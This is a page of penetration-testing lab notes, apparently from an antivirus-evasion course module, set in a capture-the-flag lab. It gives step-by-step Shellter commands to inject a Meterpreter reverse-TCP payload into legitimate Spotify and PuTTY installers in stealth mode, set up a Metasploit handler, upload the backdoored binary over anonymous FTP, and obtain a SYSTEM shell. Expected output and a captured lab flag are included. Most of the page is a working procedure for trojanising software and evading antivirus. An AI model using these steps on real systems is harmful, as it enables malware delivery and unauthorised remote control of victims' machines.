# Automating the Process

Installing shellter in Kali Linux
>``` shell
>kali@kali:~$ apt-cache search shellter
>
># ========== Expected Result ==========
>shellter - Dynamic shellcode injection tool and dynamic PE infector
># =====================================
>
>kali@kali:~$ sudo apt install shellter
>
># ========== Expected Result ==========
>...
># =====================================
>```

Installing wine in Kali Linux
>``` shell
>kali@kali:~$ sudo apt install wine
>
># ========== Expected Result ==========
>...
># =====================================
>
>kali@kali:~$ sudo dpkg --add-architecture i386 && apt-get update && apt-get install wine32
>```

Installing wine in Kali Linux (ARM processor)
>``` shell
>kali@kali:~$ sudo apt install wine
>
>kali@kali:~$ sudo dpkg --add-architecture amd64
>
>kali@kali:~$ sudo  apt install -y qemu-user-static binfmt-support
>
>kali@kali:~$ sudo apt-get update && apt-get install wine32
>```

Initial shellter console
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Automating-the-Process-1.png)

Selecting a target PE in shellter and performing a backup
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Automating-the-Process-2.png)

List of payloads available in shellter
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Automating-the-Process-3.png)

Payload options in shellter
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Automating-the-Process-4.png)

shellter verifying the injection
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Automating-the-Process-5.png)

Setting up a handler for the meterpreter payload
>``` shell
>kali@kali:~$ msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.50.1;set LPORT 443;run;"
>
># ========== Expected Result ==========
>...
>[*] Using configured payload generic/shell_reverse_tcp
>payload => windows/meterpreter/reverse_tcp
>LHOST => 192.168.50.1
>LPORT => 443
>[*] Started reverse TCP handler on 192.168.50.1:443
># =====================================
>```

Running a Quick Scan using Avira
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Automating-the-Process-6.png)

Launching the backdoored Spotify installer
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Automating-the-Process-7.png)

Receiving the meterpreter session
>``` shell
># ========== Expected Result ==========
>...
>[*] Using configured payload generic/shell_reverse_tcp
>payload => windows/meterpreter/reverse_tcp
>LHOST => 192.168.50.1
>LPORT => 443
>[*] Started reverse TCP handler on 192.168.50.1:443
>[*] Sending stage (175174 bytes) to 192.168.50.62
>[*] Meterpreter session 1 opened (192.168.50.1:443 -> 192.168.50.62:52273)...
># =====================================
>
>meterpreter > shell
>
># ========== Expected Result ==========
>Process 6832 created.
>Channel 1 created.
>Microsoft Windows [Version 10.0.22000.739]
>(c) Microsoft Corporation. All rights reserved.
># =====================================
>
>C:\Users\offsec\Desktop>whoami
>
># ========== Expected Result ==========
>whoami
>client01\offsec
># =====================================
>```

Lab 1 - Use Shellter to inject a Meterpreter reverse shell payload in the Spotify executable, then transfer the binary to your Window 11 client VM #1 and ensure that it is not being detected by the antivirus. After, set up a Meterpreter listener, run the backdoored Spotify installer, and verify that you have obtained an interactive shell. As an additional exercise, attempt to find different executables and inject malicious code into them using Shellter. Which Shellter option is responsible for restoring the execution flow of the backdoored binary and therefore avoids any unwanted suspicion?
>Stealth Mode

Lab 2 - Capstone Lab: In this exercise, you'll be facing off against COMODO antivirus engine running on Module Exercise VM #1. Use another popular 32-bit application, like PuTTY, to replicate the steps learned so far in order to inject malicious code in the binary with Shellter. The victim machine runs an anonymous FTP server with open read/write permissions. Every few seconds, the victim user will double-click on any existing .exe file(s) in the FTP root directory. If the antivirus flags the script as malicious, the script will be quarantined and then deleted. Otherwise, the script will execute and hopefully, grant you a reverse shell. NOTE: set the FTP session as active and enable binary encoding while transferring the file.
>``` shell
># Download the 32-bit PuTTY executable
>kali@kali:~$ wget https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe
>
># Enable 32-bit architecture support
>kali@kali:~$ sudo dpkg --add-architecture i386
>kali@kali:~$ sudo apt update
>
># Install Wine with 32-bit support
>kali@kali:~$ sudo apt install -y wine32:i386 wine64
>
># Reset broken Wine prefix (ONLY needed first time or if Wine errors)
>kali@kali:~$ wineserver -k
>kali@kali:~$ rm -rf ~/.wine
>
># Create a clean 32-bit Wine prefix
>kali@kali:~$ WINEARCH=win32 WINEPREFIX=$HOME/.wine winecfg
>
># Install Shellter
>kali@kali:~$ sudo apt install -y shellter
>
># Run Shellter
>kali@kali:~$ shellter
>
># Shellter Injection Choices (Manual Notes)
>Operation Mode: A (Automatic)
>PE Target: putty.exe
>Enable Stealth Mode: Y
>Payload: Meterpreter_Reverse_TCP
>LHOST: 192.168.45.218
>LPORT: 443
>Encoder: Default
>
># Metasploit Handler (Leave terminal window open)
>kali@kali:~$ msfconsole
>msf6 > use exploit/multi/handler
>msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
># Attacker IP
>msf6 exploit(multi/handler) > set LHOST 192.168.45.218
>msf6 exploit(multi/handler) > set LPORT 443
>msf6 exploit(multi/handler) > run
>
># ========== Expected Result ==========
>[*] Started reverse TCP handler on 192.168.45.218:443 
># =====================================
>
># Upload Backdoored Binary via FTP (New window)
># Target IP
>ftp -A 192.168.208.53
>Name: anonymous
>Password: anonymous
>ftp> bin
>ftp> put putty.exe
>ftp> bye
>
># Meterpreter (Back to Metasploit window)
>meterpreter > sysinfo
>
># ========== Expected Result ==========
>Computer        : VICTIM
>OS              : Windows 10 (10.0 Build 19044).
>Architecture    : x64
>System Language : en_US
>Meterpreter     : x86/windows
># =====================================
>
>meterpreter > getuid
>
># ========== Expected Result ==========
>Server username: NT AUTHORITY\SYSTEM
># =====================================
>
>meterpreter > pwd
>
># ========== Expected Result ==========
>C:\WINDOWS\system32
># =====================================
>
>meterpreter > shell
>
># ========== Expected Result ==========
>Process 7968 created.
>Channel 1 created.
>Microsoft Windows [Version 10.0.19044.1415]
>(c) Microsoft Corporation. All rights reserved.
>
>C:\WINDOWS\system32>
># =====================================
>
>C:\WINDOWS\system32>dir C:\Users
>
># ========== Expected Result ==========
>dir C:\Users
> Volume in drive C has no label.
> Volume Serial Number is 9C98-18D0
>
> Directory of C:\Users
>
>10/05/2021  12:57 PM    <DIR>          .
>10/05/2021  12:57 PM    <DIR>          ..
>03/01/2023  08:02 AM    <DIR>          Administrator
>10/04/2021  07:25 PM    <DIR>          Public
>               0 File(s)              0 bytes
>               4 Dir(s)   5,647,667,200 bytes free
># =====================================
>
>C:\WINDOWS\system32>dir C:\Users\Administrator\Desktop
>
># ========== Expected Result ==========
>dir C:\Users\Administrator\Desktop 
> Volume in drive C has no label.
> Volume Serial Number is 9C98-18D0
>
> Directory of C:\Users\Administrator\Desktop
>
>03/01/2023  08:01 AM    <DIR>          .
>03/01/2023  08:01 AM    <DIR>          ..
>12/21/2021  12:43 PM         5,711,824 cav_installer_138430010_1a.exe
>12/18/2025  01:54 PM                78 flag.txt
>03/01/2023  08:01 AM             1,378 lab.ps1
>12/06/2021  11:11 AM             2,348 Microsoft Edge.lnk
>               4 File(s)      5,715,628 bytes
>               2 Dir(s)   5,647,667,200 bytes free
># =====================================
>
>C:\WINDOWS\system32>type C:\Users\Administrator\Desktop\flag.txt
>
># ========== Expected Result ==========
>type C:\Users\Administrator\Desktop\flag.txt
>OS{2ae61bf324f5d275f855a2a0a77eef5c}
># =====================================
>```
>OS{2ae61bf324f5d275f855a2a0a77eef5c}

Lab 3 - Similar to the previous exercise, you'll be facing off against COMODO antivirus engine v12.2.2.8012 on Module Exercise VM #2. Although the PowerShell AV bypass we covered in this Module is substantial, it has an inherent limitation. The malicious script cannot be double-clicked by the user for an immediate execution. Instead, it would open in notepad.exe or another default text editor. The tradecraft of manually weaponizing PowerShell scripts is beyond the scope of this module, but we can rely on another open-source framework to help us automate this process. Research how to install and use the Veil framework to help you with this exercise. The victim machine runs an anonymous FTP server with open read/write permissions. Every few seconds, the victim user will double-click on any existing Windows batch script file(s) (.bat) in the FTP root directory. If the antivirus flags the script as malicious, the script will be quarantined and then deleted. Otherwise, the script will execute and hopefully, grant you a reverse shell.
>
